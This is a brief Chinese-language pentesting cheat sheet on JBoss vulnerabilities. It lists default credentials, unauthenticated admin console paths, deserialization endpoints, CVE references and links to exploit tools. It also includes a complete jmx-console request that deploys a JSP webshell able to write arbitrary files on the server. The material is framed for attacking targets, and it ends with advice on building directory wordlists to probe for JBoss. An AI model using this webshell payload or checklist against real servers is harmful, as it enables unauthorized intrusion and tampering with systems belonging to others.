# jboss中间件漏洞总结

## 前言

总结一下jboss漏洞。该总结来源于Vulhub靶场、wooyun90余个漏洞和exploit-db。  

## Jboss指纹

通过HTTP 响应头中的 X-Powered-By    

## JBOSS默认配置后台漏洞

漏洞发生在jboss.deployment命名空间中的addURL()函数,该函数可以远程下载一个war压缩包并解压。

`/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployment%3Atype%3DDeploymentScanner%2Cflavor%3DURL`    

## 弱口令/未授权访问

admin/admin

* /admin-console/login.seam
* /admin-console/
* /jmx-console/
* /web-console/
* /jmx-console/HtmlAdaptor?action=displayMBeans
* /web-console/ServerInfo.jsp

## Jboss蠕虫

/zecmd/zecmd.jsp  

## JMX控制台安全验证绕过漏洞（CVE-2010-0738）

通过HEAD方法绕过验证部署webshell [https://github.com/ChristianPapathanasiou/jboss-autopwn](https://github.com/ChristianPapathanasiou/jboss-autopwn)

## 反序列化漏洞

  /invoker/JMXInvokerServlet /invoker/EJBInvokerServlet /invoker/readonly //CVE-2017-12149 /jbossmq-httpil/HTTPServerILServlet //CVE-2017-7504

## 命令执行

```bash
/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=upload5warn.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True
```

## 拒绝服务

CVE-2018-1041 [https://www.exploit-db.com/exploits/44099](https://www.exploit-db.com/exploits/44099)

## 其他漏洞

访问[https://www.exploit-db.com/search?q=JBoss](https://www.exploit-db.com/search?q=JBoss)

## 总结

可以制作一个网站目录字典，发现中间件是Jboss，用字典探测，效率会比较高。

